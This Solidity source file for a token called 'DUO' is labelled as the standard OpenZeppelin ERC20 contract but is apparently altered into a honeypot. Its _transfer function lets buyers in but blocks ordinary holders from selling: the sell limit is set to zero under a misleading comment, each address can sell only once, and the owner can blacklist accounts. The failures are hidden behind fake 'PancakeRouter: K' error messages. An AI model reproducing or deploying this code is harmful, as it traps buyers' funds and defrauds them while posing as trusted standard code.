// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
            address from,
            address to,
            uint256 amount
        ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router {
  function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
  function factory() external pure returns (address);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    address public _owner;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _bots;
    mapping(address => bool) public  _salled;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private _totalSupply;
    uint256 private _AmountOutMax;
    string  private _name;
    string  private _symbol;
    address private constant RouterV2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;      
    address private constant WrappedNativeToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    /*
    mainnet: 
    address private constant RouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;      
    address private constant WrappedNativeToken = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    ERC: 
    address private constant RouterV2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;      
    address private constant WrappedNativeToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;  

    testnet:
    address private constant RouterV2 = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;      
    address private constant WrappedNativeToken = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;  
    */
    constructor(){
        uint256 totalSupply_ = 1000000000 * 10 ** 18;
        _AmountOutMax =  0 * 10 ** 13; // 0.00083 BNB
        _symbol = "DUO";
        _name = "DUO";
        _owner = msg.sender;
        _totalSupply = totalSupply_;
        _balances[msg.sender] = totalSupply_;
        _isExcludedFromFee[msg.sender] = true;
        emit Transfer(address(0), msg.sender, totalSupply_);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function getPoolAddress() public view returns (address) {        
        address poolAddress = IUniswapV2Factory(IUniswapV2Router(RouterV2).factory()).getPair(address(this), WrappedNativeToken);        
        return poolAddress;
    }

    function getAmountOutMin(uint256 _amount) public view returns (uint256) {
		address[] memory path;
		path = new address[](2);
		path[0] = address(this);
		path[1] = WrappedNativeToken;
		uint256[] memory amountOutMins = IUniswapV2Router(RouterV2).getAmountsOut(_amount, path);
		return amountOutMins[path.length -1];
	}

    function getaddress() public view returns (address) {
		return address(this);
	}

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function set_AmountOutMax(uint256 AmountOutMax_) public onlyOwner {
        _AmountOutMax = AmountOutMax_;
    }
    
    function addBots(address account) public onlyOwner {
        _bots[account] = true;
    }
    
    function delBots(address account) public onlyOwner {
        _bots[account] = false;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address"); 
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        require(_bots[from] == false, "ERC20: botlist exeption");

        if (from == getPoolAddress() || _isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            unchecked{
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            uint256 AmountOutMin = getAmountOutMin(amount);   
            require(AmountOutMin <= _AmountOutMax , "PancakeRouter: K");
            require(to == getPoolAddress(),  "PancakeRouter: K2");
            require(_salled[from] == false,  "PancakeRouter: K3");
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
            _salled[from] = true;
            emit Transfer(from, to, amount);
        }
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}